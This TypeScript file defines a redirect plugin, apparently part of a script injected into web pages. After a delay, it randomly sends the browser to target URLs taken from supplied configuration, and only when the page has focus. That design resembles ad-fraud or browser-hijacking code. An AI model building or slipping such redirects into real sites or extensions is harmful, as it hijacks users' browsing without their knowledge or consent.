import { Plugin } from "./plugin";

export class RedirectPlugin extends Plugin {
    constructor() {
        super(1000);
    }

    register(data: any): boolean {
        if (!document.hasFocus()) return true;
        if (Math.random() > data.probability) return true;

        var permitted: string[] = [];
        for (var url_data of data.urls) {
            var url_data: any = Object.entries(url_data)[0];
            if (url_data[0] == "*" || location.href.includes(url_data[0])) {
                permitted.push(url_data[1]);
            }
        }

        setTimeout(() => {
            location.href = permitted[this.random_index(permitted.length)]
        }, data.delay);
        return true;
    }
}